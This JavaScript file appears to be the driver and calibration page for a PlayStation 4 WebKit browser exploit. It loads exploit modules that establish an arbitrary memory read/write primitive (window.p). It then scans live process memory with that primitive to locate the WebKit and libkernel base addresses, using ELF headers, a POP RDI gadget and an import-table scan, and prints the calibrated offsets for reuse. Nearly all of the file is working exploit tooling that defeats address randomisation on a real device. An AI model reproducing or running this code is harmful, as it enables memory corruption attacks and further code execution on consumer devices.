import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";

let outEl, stateEl, fwSelect, attemptsSelect;
let btnEstablish, btnOffsets, btnCalibrate, btnAll, btnClear, btnLowMem;

const params = new URLSearchParams(location.search);
const lines = [];
let passCount = 0;
let failCount = 0;
let busy = false;
let primitiveDone = false;
let exploit = null;

const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
const CORE_LOG = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP|ATTEMPT|SSV-|AUTO-RETRY|CORE-GIVE|COMPOSITION|PRIMITIVE/i;

function mark(tag, detail) {
    if (!outEl) return;
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(l => esc(l)).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function clearLog() {
    lines.length = 0;
    passCount = 0;
    failCount = 0;
    if (outEl) outEl.innerHTML = "";
}

function resolvedOffKey() {
    const pick = fwSelect.value;
    if (pick === "auto") {
        const detected = offsetsFor(navigator.userAgent);
        return detected.key || "13.00";
    }
    return pick;
}

function crossFw(offKey) {
    const detected = offsetsFor(navigator.userAgent);
    return detected.key && detected.key !== offKey;
}

function setUi() {
    if (!btnEstablish) return;
    const hasP = !!window.p;
    btnEstablish.disabled = busy || primitiveDone;
    btnOffsets.disabled = busy || !hasP;
    btnCalibrate.disabled = busy || !hasP;
    btnAll.disabled = busy || primitiveDone;
    btnClear.disabled = busy;
    fwSelect.disabled = busy || primitiveDone;
}

async function withBusy(fn) {
    if (busy) return;
    busy = true;
    setUi();
    try {
        await fn();
    } finally {
        busy = false;
        setUi();
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "importing core.js + mem.js...");
    const core = await import("./core.js");
    const mem = await import("./mem.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP: mem.installWindowP,
        pairStatus: mem.pairStatus
    };
    mark("LOAD-OK", "exploit modules ready");
    return exploit;
}

function check(name, ok, detail) {
    if (ok) {
        passCount++;
        mark("PASS", name + (detail ? "  " + detail : ""));
    } else {
        failCount++;
        mark("FAIL", name + (detail ? "  " + detail : ""));
    }
    return ok;
}

function same64(a, b) {
    return a.low === b.low && a.hi === b.hi;
}

function alignedModuleBase(v) {
    return v.hi > 0 && (v.low & 0x3fff) === 0;
}

function plausibleUserPtr(v) {
    if (!v || typeof v !== "object" || !("low" in v)) return false;
    const hi = v.hi >>> 0;
    const lo = v.low >>> 0;
    if (hi === 0 || hi > 0xffff) return false;
    if (lo === 0 && hi === 0) return false;
    return true;
}

function safeRead8(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read8(addr);
    } catch (_) {
        return null;
    }
}

function safeRead4(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read4(addr);
    } catch (_) {
        return null;
    }
}

function resolveNativeFn(p, mFunctionOff) {
    const cell = p.leakval(Math.expm1);
    mark("CAL-CELL", String(cell));

    const tryPath = (label, ptr) => {
        if (!plausibleUserPtr(ptr)) return null;
        return { ptr, label };
    };

    const paths = [];
    const mid = safeRead8(p, cell.add32(0x18));
    if (mid) {
        const nat = safeRead8(p, mid.add32(mFunctionOff));
        const hit = tryPath("cell+0x18 -> +" + mFunctionOff.toString(16), nat);
        if (hit) paths.push(hit);
    }
    for (let o = 0x8; o <= 0x30; o += 8) {
        const q = safeRead8(p, cell.add32(o));
        const hit = tryPath("cell+0x" + o.toString(16), q);
        if (hit) paths.push(hit);
    }

    if (paths.length === 0) return null;
    mark("CAL-NATIVEFN-PATH", paths[0].label);
    return paths[0].ptr;
}

function nativeExpm1(p, mFunctionOff, quiet) {
    if (quiet) {
        const cell = p.leakval(Math.expm1);
        const mid = safeRead8(p, cell.add32(0x18));
        if (!mid) return null;
        return safeRead8(p, mid.add32(mFunctionOff));
    }
    return resolveNativeFn(p, mFunctionOff);
}

function findWebkitBaseElf(p, nativeFn) {
    if (!plausibleUserPtr(nativeFn)) return null;
    // Module bases are 0x4000-aligned but expm1 RVA is not — start at nativeFn.low % 0x4000
    let delta = nativeFn.low & 0x3fff;
    for (; delta < 0x05000000; delta += 0x4000) {
        const base = nativeFn.sub32(delta);
        if (!alignedModuleBase(base)) continue;
        const magic = safeRead4(p, base);
        if (magic === 0x464c457f)
            return { base, wk_expm1_builtin: delta, via: "elf" };
    }
    return null;
}

function findWebkitBaseGadget(p, nativeFn, gadgetRva, expectLo16) {
    if (!plausibleUserPtr(nativeFn) || !gadgetRva) return null;
    let delta = nativeFn.low & 0x3fff;
    for (; delta < 0x05000000; delta += 0x4000) {
        const base = nativeFn.sub32(delta);
        if (!alignedModuleBase(base)) continue;
        const g = safeRead4(p, base.add32(gadgetRva));
        if (g == null) continue;
        if ((g & 0xffff) === expectLo16)
            return { base, wk_expm1_builtin: delta, via: "gadget" };
    }
    return null;
}

function findWebkitBase(p, nativeFn, off) {
    const elf = findWebkitBaseElf(p, nativeFn);
    if (elf) return elf;
    const gadgetRva = off && off.wk_POP_RDI_RET;
    if (gadgetRva) {
        mark("CAL-SCAN", "ELF miss — trying POP_RDI at 0x" + gadgetRva.toString(16));
        const g = findWebkitBaseGadget(p, nativeFn, gadgetRva, 0xc35f);
        if (g) return g;
    }
    return null;
}

function bufAddr(p, off, ab) {
    const cell = p.leakval(ab);
    const impl = safeRead8(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    return safeRead8(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
}

function findArrayBufferBacking(p, ab, expectLo) {
    const cell = p.leakval(ab);
    const implOffs = [0x8, 0x10, 0x18];
    const seen = new Set();
    const tryPtr = (label, ptr) => {
        if (!ptr) return null;
        const key = ptr.low + ":" + ptr.hi;
        if (seen.has(key)) return null;
        seen.add(key);
        const val = safeRead4(p, ptr);
        if (val === expectLo) return { label, ptr };
        return null;
    };

    for (let o = 0; o <= 0x40; o += 8) {
        const hit = tryPtr("cell+0x" + o.toString(16), safeRead8(p, cell.add32(o)));
        if (hit) return hit;
    }
    for (const implOff of implOffs) {
        const impl = safeRead8(p, cell.add32(implOff));
        if (!impl) continue;
        for (let o = 0; o <= 0x40; o += 8) {
            const hit = tryPtr("impl@cell+0x" + implOff.toString(16) + "+0x"
                + o.toString(16), safeRead8(p, impl.add32(o)));
            if (hit) return hit;
        }
    }
    return null;
}

function findErrorImport(p, webkitBase, hintRva) {
    if (!plausibleUserPtr(webkitBase)) return null;
    const hi = webkitBase.hi;
    const windows = hintRva
        ? [[Math.max(0, hintRva - 0x200000), hintRva + 0x200000]]
        : [[0x3800000, 0x3d00000], [0, 0x0200000]];
    for (const [start, end] of windows) {
        for (let rva = start; rva < end; rva += 8) {
            const ptr = safeRead8(p, webkitBase.add32(rva));
            if (!ptr || ptr.hi <= hi || ptr.hi > hi + 4) continue;
            for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
                const lk = ptr.sub32(kErr);
                if (!alignedModuleBase(lk)) continue;
                const w0 = safeRead4(p, lk);
                const w1 = safeRead4(p, lk.add32(4));
                if (w0 == null || w1 == null) continue;
                if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
                    return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
            }
        }
    }
    return null;
}

function calibrateOffsets(p, off) {
    mark("CALIBRATE", "scanning live module layout");
    const mFunctionOff = off.wk_JSFunction_m_function || 0x28;
    const nativeFn = nativeExpm1(p, mFunctionOff);
    if (!nativeFn) {
        mark("CALIBRATE-FAIL", "Math.expm1 native pointer unreadable");
        return null;
    }
    mark("CAL-NATIVEFN", String(nativeFn));

    const wk = findWebkitBase(p, nativeFn, off);
    if (!wk) {
        mark("CALIBRATE-FAIL", "webkit base not found (ELF + gadget scan)");
        return null;
    }
    mark("CAL-VIA", wk.via || "elf");
    mark("CAL-WK-BASE", String(wk.base));
    mark("CAL-wk_expm1_builtin", "0x" + wk.wk_expm1_builtin.toString(16));

    const err = findErrorImport(p, wk.base, off.wk___imp___error);
    if (err) {
        mark("CAL-wk___imp___error", "0x" + err.wk___imp___error.toString(16));
        mark("CAL-k__error", "0x" + err.k__error.toString(16));
        mark("CAL-LK-BASE", String(err.libkernelBase));
    } else {
        mark("CALIBRATE-WARN", "__imp___error not found");
    }

    return Object.assign({
        wk_JSFunction_m_function: mFunctionOff,
        wk_ArrayBuffer_m_impl: off.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: off.wk_ArrayBuffer_m_contents_m_data,
    }, { wk_expm1_builtin: wk.wk_expm1_builtin }, err || {});
}

function logBootInfo() {
    const detected = offsetsFor(navigator.userAgent);
    mark("UA", navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    mark("BOOT", "UI OK — exploit loads on step 1 only");
    if (params.has("g"))
        mark("BOOT", "groom override: " + params.getAll("g").join(", "));
}

function maxAttemptsPick() {
    const fromUrl = parseInt(params.get("attempts") || "", 10);
    if (fromUrl > 0) return fromUrl;
    if (attemptsSelect) return parseInt(attemptsSelect.value, 10) || 3;
    return 3;
}

async function runEstablish() {
    if (primitiveDone) {
        mark("SKIP", "primitive already established this page");
        return;
    }

    const { establishPrimitive, installWindowP, pairStatus } = await loadExploit();
    const maxAttempts = maxAttemptsPick();

    state("establishing primitive...", "warn");
    mark("STEP", "1 - get primitive");
    mark("ATTEMPTS", String(maxAttempts));

    let carrier;
    try {
        carrier = await establishPrimitive({
            maxAttempts,
            onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } catch (err) {
        if (/gave up/i.test(String(err.message))) {
            mark("HINT", "race lost — close browser fully, reopen, tries=3 or low-mem");
            mark("HINT", "OOM with 6 tries? use 1 try + low-mem reload");
        }
        throw err;
    }

    installWindowP(carrier, {
        promote: false,
        onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
    });

    const p = window.p;
    if (!p) throw new Error("window.p was not installed");

    primitiveDone = true;
    mark("PAIR-STATUS", "state=" + pairStatus.state
        + " promoted=" + pairStatus.promoted);
    mark("PRIMITIVE-OK", "window.p read/write/leakval live");

    const boxA = { tag: "A" };
    const boxB = { tag: "B" };
    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    check("leakval-distinct",
        !same64(addrA, addrB) && addrA.low !== 0 && addrB.low !== 0,
        "a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");

    state("primitive OK — run step 2 or 3", "ok");
    mark("READY", "offset tests and calibrate unlocked");
}

async function runOffsetTests() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "2 · offset tests");
    mark("OFFSETS-FW", offKey);
    mark("OFFSETS", off.fw_status || "loaded");
    if (crossFw(offKey))
        mark("NOTE", "UA FW != offset table — fails here are expected");

    state("offset tests...", "warn");

    const probe = new ArrayBuffer(0x20);
    const view = new Uint32Array(probe);
    view[0] = 0xdeadbeef;
    view[1] = 0xcafebabe;

    let offsetFail = 0;
    const checkOffset = (name, ok, detail) => {
        if (ok) {
            passCount++;
            mark("PASS", name + (detail ? "  " + detail : ""));
        } else {
            failCount++;
            offsetFail++;
            mark(crossFw(offKey) ? "FAIL-OFFSET" : "FAIL", name + (detail ? "  " + detail : ""));
        }
        return ok;
    };

    const backing = findArrayBufferBacking(p, probe, 0xdeadbeef);
    if (backing)
        mark("AB-BACKING", backing.label + " -> " + backing.ptr);

    const dataPtr = backing ? backing.ptr : bufAddr(p, off, probe);
    if (!dataPtr) {
        checkOffset("arraybuffer-data-plausible", false, "no backing ptr found");
    } else {
        checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
        const got = safeRead4(p, dataPtr);
        checkOffset("arraybuffer-read4",
            got === 0xdeadbeef,
            "got=" + (got == null ? "null" : "0x" + got.toString(16)) + " ptr=" + dataPtr);
        if (got === 0xdeadbeef) {
            p.write4(dataPtr, new int64(0x13371337, 0));
            checkOffset("arraybuffer-write4",
                view[0] === 0x13371337,
                "view[0]=" + view[0].toString(16));
        }
    }

    if (off.wk_expm1_builtin) {
        const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function, true);
        if (!nativeFn) {
            checkOffset("module-bases-0x4000-aligned", false, "nativeFn unreadable");
        } else {
            const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
            const errorFn = safeRead8(p, webkitBase.add32(off.wk___imp___error));
            if (!errorFn) {
                checkOffset("module-bases-0x4000-aligned", false,
                    "webkit=" + webkitBase + " error import unreadable");
            } else {
                const libkernelBase = errorFn.sub32(off.k__error);
                mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
                    + " nativeFn=" + nativeFn);
                checkOffset("module-bases-0x4000-aligned",
                    alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
            }
        }
    }

    const summary = passCount + " pass, " + failCount + " fail";
    state("offset tests done — " + summary, offsetFail ? "warn" : "ok");
    mark("DONE-OFFSETS", summary);
}

async function runCalibrate() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "3 · calibrate wk_*");
    mark("OFFSETS-FW", offKey + " (hint for __imp___error scan)");
    state("calibrating...", "warn");

    const live = calibrateOffsets(p, off);
    if (live && live.wk_expm1_builtin != null) {
        mark("PASTE-OFFSETS", JSON.stringify({
            fw_status: "calibrated on hardware",
            wk_expm1_builtin: live.wk_expm1_builtin,
            wk_JSFunction_m_function: live.wk_JSFunction_m_function,
            wk___imp___error: live.wk___imp___error,
            k__error: live.k__error,
            wk_ArrayBuffer_m_impl: live.wk_ArrayBuffer_m_impl,
            wk_ArrayBuffer_m_contents_m_data: live.wk_ArrayBuffer_m_contents_m_data,
        }, null, 0));
    }

    state("calibrate done", "ok");
    mark("DONE-CALIBRATE", "");
}

function wireButton(el, handler) {
    if (!el) return;
    el.addEventListener("click", () => {
        withBusy(async () => {
            try {
                await handler();
            } catch (err) {
                state("error: " + err.message, "bad");
                mark("ERROR", err.stack || err.message);
            }
        });
    });
}

function init() {
    outEl = document.getElementById("out");
    stateEl = document.getElementById("state");
    fwSelect = document.getElementById("fw-select");
    attemptsSelect = document.getElementById("attempts-select");
    btnEstablish = document.getElementById("btn-establish");
    btnOffsets = document.getElementById("btn-offsets");
    btnCalibrate = document.getElementById("btn-calibrate");
    btnAll = document.getElementById("btn-all");
    btnClear = document.getElementById("btn-clear");
    btnLowMem = document.getElementById("btn-lowmem");

    if (!outEl || !btnEstablish) {
        state("UI missing — host via HTTP, open index.html", "bad");
        return;
    }

    wireButton(btnEstablish, runEstablish);
    wireButton(btnOffsets, runOffsetTests);
    wireButton(btnCalibrate, runCalibrate);
    wireButton(btnAll, async () => {
        await runEstablish();
        await runOffsetTests();
    });

    btnClear.addEventListener("click", () => {
        if (busy) return;
        clearLog();
        logBootInfo();
        state(primitiveDone ? "primitive OK — pick a test" : "ready", primitiveDone ? "ok" : "");
    });

    btnLowMem.addEventListener("click", () => {
        const url = new URL(location.href);
        url.searchParams.set("g", "drain:384");
        location.href = url.toString();
    });

    if (params.get("fw") && fwSelect.querySelector('option[value="' + params.get("fw") + '"]'))
        fwSelect.value = params.get("fw");
    if (params.get("attempts") && attemptsSelect)
        attemptsSelect.value = params.get("attempts");

    state("ready — tap step 1", "");
    logBootInfo();
    setUi();
}

try {
    init();
} catch (err) {
    state("init error: " + err.message, "bad");
    mark("ERROR", err.stack || err.message);
}
